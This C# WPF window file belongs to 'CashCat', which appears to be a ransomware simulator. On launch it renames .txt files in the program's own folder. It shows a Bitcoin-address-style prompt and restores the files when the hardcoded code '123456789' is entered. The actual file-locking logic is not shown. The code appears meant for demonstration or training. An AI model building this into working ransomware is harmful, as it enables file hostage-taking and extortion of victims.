using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;


namespace CashCat
{

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        private FileSystemOperation fileOperations;

        public MainWindow()
        {
            InitializeComponent();
            fileOperations = new FileSystemOperation();
            fileOperations.RenameTXTFiles(AppDomain.CurrentDomain.BaseDirectory);
        }

        
        private void Button_Click(object sender, RoutedEventArgs e)
        {

            if (txtbox_Bitcoingaddess.Text == "123456789")
            {

                fileOperations.UnlockLockyFiles(AppDomain.CurrentDomain.BaseDirectory);
                MessageBox.Show("Unlocked! Thanks!", "You did it correct", MessageBoxButton.OK);

            }
            else
            {
                MessageBox.Show("Denied!", "You did it wrong", MessageBoxButton.OK);
            }

        }

        private void txtbox_Bitcoingaddess_GotFocus(object sender, RoutedEventArgs e)
        {
            //Clear Text On Click
            if (txtbox_Bitcoingaddess.Text == "Unlock Code Here")
            {
                txtbox_Bitcoingaddess.Text = "";
            }
        }

    
    }
}
